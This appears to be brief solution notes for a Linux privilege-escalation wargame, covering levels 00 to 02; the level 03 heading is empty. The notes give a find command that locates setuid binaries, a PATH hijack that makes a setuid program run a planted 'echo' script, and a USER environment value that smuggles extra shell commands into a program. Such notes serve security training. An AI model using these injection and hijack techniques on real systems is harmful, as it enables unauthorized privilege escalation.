# level 00
find / -perm -4000 -exec ls -ldb {} \; | grep "flag00"

# level 01
write the following lines to a file in /tmp/echo:

```
#!/bin/sh
printf '%s\n' 'i win' 

PATH=/tmp/echo:$PATH flag01
```

it will execute your echo script.

# level 02

Set the `USER` environment variable, then run the executable
```
USER='"foo"; echo "owned"; echo "foo"'
```

# level 03

